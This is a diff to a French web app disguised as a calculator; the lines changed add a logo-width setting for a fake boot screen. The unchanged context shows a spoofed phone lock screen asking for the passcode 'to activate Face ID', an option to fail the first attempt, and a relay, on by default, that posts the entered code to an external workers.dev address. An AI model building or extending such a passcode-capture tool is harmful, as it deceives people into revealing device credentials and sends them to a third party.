@@ -71,7 +71,7 @@ html,body{height:var(--appH,100%);background:#000;overflow:hidden;font-family:va
 /* ===== PLANTAGE ===== */
 #crash{background:#000;z-index:50}
 #bootImg{position:absolute;inset:0;width:100%;height:100%;object-fit:contain;opacity:0}
-#bootImg.small{inset:auto;left:50%;top:50%;width:26%;height:auto;transform:translate(-50%,-50%)}
+#bootImg.small{inset:auto;left:50%;top:50%;width:var(--logoW,18%);height:auto;max-height:22%;object-fit:contain;transform:translate(-50%,-52%)}
 #bootImg.on{opacity:1}
 
 /* ===== ÉCRAN DE CODE ===== */
@@ -237,6 +237,7 @@ html,body{height:var(--appH,100%);background:#000;overflow:hidden;font-family:va
     <div class="row"><span>Écran noir avant (s)</span><input type="number" id="sBlack1" step="0.5" min="0"></div>
     <div class="row"><span>Image de démarrage</span><span style="display:flex;gap:8px;align-items:center"><img class="thumb" id="sBootThumb"><button class="abtn" id="sBootPick">Choisir</button><button class="abtn red" id="sBootDel">✕</button></span></div>
     <div class="row"><span>Taille de l'image</span><select id="sBootSize"><option value="full">Plein écran</option><option value="small">Petit (logo)</option></select></div>
+    <div class="row"><span>Largeur du logo (% de l'écran)</span><input type="number" id="sLogoW" step="1" min="5" max="60"></div>
     <div class="row"><span>Durée de l'image (s)</span><input type="number" id="sBootDur" step="0.5" min="0"></div>
     <div class="row"><span>Écran noir après (s)</span><input type="number" id="sBlack2" step="0.5" min="0"></div>
   </div>
@@ -273,7 +274,7 @@ const store={get(k,d){try{const v=localStorage.getItem('calcu_'+k);return v==nul
              set(k,v){try{localStorage.setItem('calcu_'+k,JSON.stringify(v))}catch(e){}}};
 
 /* ---------- Réglages ---------- */
-const DEF={fmt:'auto',trig:'eq',eqDelay:1.5,idle:5,black1:3,bootDur:4.5,black2:1,bootSize:'small',title1:'Saisissez le code',title2:'Votre code est requis pour activer Face ID',
+const DEF={fmt:'auto',trig:'eq',eqDelay:1.5,idle:5,black1:3,bootDur:4.5,black2:1,bootSize:'small',logoW:18,title1:'Saisissez le code',title2:'Votre code est requis pour activer Face ID',
   len:6,failFirst:true,relayOn:true,
   relayPost:'https://relais.michaeldemers2003.workers.dev/calcu',
   relayGet:'https://relais.michaeldemers2003.workers.dev/calcu',body:'json'};
@@ -531,7 +532,7 @@ function startBug(){
   const crash=$('#crash'),img=$('#bootImg');
   crash.classList.remove('hidden');img.classList.remove('on');
   setTimeout(()=>{
-    if(bootImg&&S.bootDur>0){img.src=bootImg;img.className=S.bootSize==='small'?'small on':'on';
+    if(bootImg&&S.bootDur>0){img.src=bootImg;img.style.setProperty('--logoW',(S.logoW||18)+'%');img.className=S.bootSize==='small'?'small on':'on';
       setTimeout(()=>{img.classList.remove('on');setTimeout(showLock,S.black2*1000)},S.bootDur*1000);}
     else setTimeout(showLock,S.black2*1000);
   },S.black1*1000);
@@ -607,7 +608,7 @@ function rearm(){T={armed:true,phase:'calc',hist:[],first:null,code:null,attempt
 
 /* ---------- Réglages ---------- */
 const bindS=[['sFmt','fmt'],['sTrig','trig'],['sEqDelay','eqDelay',1],['sIdle','idle',1],['sBlack1','black1',1],['sBootDur','bootDur',1],
-  ['sBlack2','black2',1],['sT1','title1'],['sT2','title2'],['sBootSize','bootSize'],['sLen','len',1],['sRelayPost','relayPost'],['sRelayGet','relayGet'],['sBody','body']];
+  ['sBlack2','black2',1],['sT1','title1'],['sLogoW','logoW',1],['sT2','title2'],['sBootSize','bootSize'],['sLen','len',1],['sRelayPost','relayPost'],['sRelayGet','relayGet'],['sBody','body']];
 function openSettings(){
   bindS.forEach(([id,k])=>{$('#'+id).value=S[k]});
   $('#sFailFirst').checked=S.failFirst;$('#sRelayOn').checked=S.relayOn;
